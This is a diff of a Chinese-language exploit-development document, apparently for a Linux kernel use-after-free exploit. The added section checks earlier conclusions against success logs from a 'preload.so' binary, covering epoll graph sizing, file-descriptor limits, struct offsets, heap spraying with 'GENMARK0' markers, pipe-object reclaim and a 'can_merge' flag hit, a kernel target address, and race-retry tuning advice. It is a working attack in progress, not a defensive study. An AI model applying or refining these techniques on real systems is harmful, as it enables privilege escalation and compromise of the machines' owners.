@@ -892,6 +892,50 @@ if (uVar13 != 0) {                                 /* uVar13 = chain_hit */
 `epitem_gen` / `epitem_depth` 哨兵。**故这 4 个哨兵用于诊断是对的**，
 但如 §2.17.1 所述，验收判据不依赖它们。
 
+### 2.19 对 `preload.so` **自身成功运行日志**的交叉验证
+
+§2.14–§2.18 的结论此前只来自 `annotated.c`（**另一个构建**）。
+现逐条与权威二进制 `preload.so` 的成功运行日志 `preload-full-log.txt` 比对：
+
+| 结论 | `preload.so` 实际日志 | 状态 |
+|---|---|---|
+| 图 = 96 × 256 = 24,576（§2.16） | `GRAPH_READY width=96 fanout=256 edges=24576` | ✅ 确认 |
+| `RLIMIT_NOFILE` 前置量 = 24,736（§2.14） | `FD_LIMIT_INITIAL cur=32768 max=32768 graph_only=24736` | ✅ 确认 |
+| 前置算式（§2.14） | `fd_preflight current=952 graph_additional=24736 required_total=25688 limit_cur=32768` | ✅ `952+24736=25688`，且 `25688 ≤ 32768` |
+| 全部几何常量（§2.15） | `static_layout eventpoll_size=0xd0 gen=0xa8 refs=0xb0 depth=0xb8 refcount=0xbc epitem_ep=0x48 epitem_fllink=0x50 … pipe_object=0x800` | ✅ 逐项一致 |
+| `can_merge` 读回（§2.18.2） | `RECLAIM_HIT mode=pipe round=1 … can_merge=0` | ✅ 确认 |
+| 两模式判据（§2.18.2） | `FLAGS_CANDIDATE round=2 chain_hit=1 bit4=1` | ✅ 真实成功样本 |
+| 目标地址（§2.2 / profile W1） | `CHAIN_HIT mode=zero round=0 target=0xffffff80027c6960` | ✅ 与本仓库 profile **逐字一致** |
+
+#### 2.19.1 `generation` 哨兵 = ASCII `GENMARK0`
+
+```
+0x304b52414d4e4547 (little-endian) → "GENMARK0"
+```
+
+这是**喷入的标记**，不是随机值。`marker_changed` 判据即
+「`epitem.generation` 是否已不再读回 `GENMARK0`」——
+读到标记 = 未被回收；读到别的 = 回收成功。
+
+#### 2.19.2 竞态需要多轮，且成功可在第 0 轮（批次 D 的重试语义）
+
+```
+round=0 delay_us=0 generation=0x304b52414d4e4547 depth=68 mc=0 chain=0 bit4=0
+round=1 delay_us=1 generation=0x000000000000c18f depth=1  mc=1 chain=1 bit4=0
+round=2 delay_us=2 generation=0x000000000000c255 depth=1  mc=1 chain=1 bit4=1   ← 成功
+（另一次运行）
+round=0 delay_us=0 generation=0x000000000001831d depth=1  mc=1 chain=1 bit4=1   ← 第 0 轮即成功
+```
+
+要点：
+
+1. **首轮 `depth=68`** = 喷入的槽位数（`outer_depth`），即喷了 68 份 `GENMARK0`。
+2. **`delay_us` 阶梯自 0 递增**（0, 1, 2, …）——与批次 A 的 `delay_us` 日志同源。
+3. **`marker_changed` 0 → 1** 才是回收生效；`chain_hit=1` 但 `bit4=0` 仍**不算成功**
+   （round=1 即如此），必须等到 `bit4=1`（`can_merge` 位命中）。
+4. **成功可能发生在第 0 轮**（第二次运行）⇒ 批次 D **必须是有界的重试循环**，
+   不能假定首轮命中；单轮失败不代表机制无效。
+
 ## 3. 真实机制（综合 §2）
 
 1. **取地址**：`direct_map_base` + `selinux_image_off` → `direct_map_alias=0xffffff80027c6960`，
